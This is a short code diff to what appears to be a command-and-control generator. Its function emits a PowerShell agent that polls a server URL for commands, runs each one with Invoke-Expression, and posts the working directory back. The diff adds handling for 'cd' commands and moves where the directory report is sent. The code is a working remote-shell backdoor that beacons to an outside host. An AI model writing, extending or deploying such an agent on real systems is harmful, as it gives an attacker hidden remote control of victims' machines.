@@ -11,13 +11,21 @@ def generate(url, frequency):
 
     while ($true)
     {
+        Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8'
         Start-Sleep -Seconds $frequency
         $cmd = Invoke-WebRequest -Method POST '%URL%/get'
         if ($cmd.Content -eq 'exit-agent') { break }
         if ($cmd.Content -like '*set-frequency*') { $frequency = $cmd.Content.replace("set-frequency ", ""); continue }
         if ($cmd.Content -eq '') { continue }
 
-        Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8'
+        if ($cmd.Content -like '*cd*') 
+        { 
+            Set-Location $cmd.Content.replace("cd ", "")
+            $pwd = Get-Location
+            Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8'
+            $post = 'True'
+        }
+
         $result = Invoke-Expression $cmd
         
         if ($result -is [string]) { $post = $result }
